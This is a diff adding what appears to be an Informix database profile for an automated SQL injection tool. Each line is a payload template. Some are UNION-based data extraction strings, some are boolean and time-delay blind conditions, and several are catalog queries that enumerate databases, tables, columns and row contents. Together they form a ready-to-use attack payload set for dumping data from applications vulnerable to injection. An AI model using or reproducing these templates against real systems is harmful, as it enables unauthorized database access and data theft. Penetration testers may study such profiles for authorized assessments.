@@ -1,0 +1,31 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols} from sysmaster:sysdual
+UnionData:1=2 union all select {cols} from (select skip {rowIndex} first 1 {cols} from {db}:{table}{where})
+BoolData:{expr}>{value}
+DataSplitStr:8702
+DataStartStr:8701
+DataEndStr:8703
+DBCount:(select count(*) from sysmaster:sysdatabases)
+TableCount:(select count(*) from {db}:systables where tabtype='T' and tabid>99)
+ColumnCount:(select count(*) from {db}:systables t,{db}:syscolumns c where t.tabid=c.tabid and t.tabname={table})
+DBName:(select name from (select skip {index} first 1 name from sysmaster:sysdatabases))
+DBNames:(select name from sysmaster:sysdatabases)
+TableName:(select tabname from (select skip {index} first 1 tabname from {db}:systables where tabtype='T' and tabid>99))
+TableNames:(select tabname from {db}:systables where tabtype='T' and tabid>99)
+ColumnName:(select colname from (select skip {index} first 1 colname from {db}:systables t,{db}:syscolumns c where t.tabid=c.tabid and t.tabname={table}))
+ColumnNames:(select colname from {db}:systables t,{db}:syscolumns c where t.tabid=c.tabid and t.tabname={table})
+Substr:substr(({expr}),{start},{len})
+Concat:{startMark}||{split}||{cols}||{split}||{endMark}
+Length:length(({expr}))
+Cast:rtrim(cast({expr} as char(32767)))
+IfNull:nvl({expr},' ')
+Ascii:ascii({expr})
+Hex:hex({expr})
+DataValue:(select {cols} from (select skip {rowIndex} first 1 {cols} from {db}:{table}{where}))
+DataCount:(select count(*) from {db}:{table}{where})
+SleepBoolData: 1=(case when({cond}) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)
+ErrorChunkLen:80
+BlindStrategy: hex
+DnsChannel: no
